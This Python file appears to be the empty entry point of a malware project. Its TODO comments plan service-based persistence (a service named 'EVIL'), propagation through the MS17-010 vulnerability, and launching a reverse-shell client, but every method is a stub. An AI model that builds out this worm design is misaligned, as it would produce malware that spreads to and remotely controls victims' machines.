#!/usr/bin/env python
#coding=utf-8
__author__ = 'Karl Boulais'

from client import Client
from persistence import Persistence

class main():
    def __init__(self):
        pass

    def checkifRunningAsService(self):
        pass
        # if Persistence().serviceInstalled():
        # TODO
        #if service is present
            #if service is running:
                #start client
                # start propagation MS17-010
            #else:
                #enable service / start service
                #then quit
        #else:
            #install service
            #Start service
            #then quit.
            # En théorie l'instance démarrée en service vérifie que le service EVIL roule (elle-même)
            # Démarre le client reverseshell

    def main(self):
        pass

if __name__ == "__main__":
    main().main()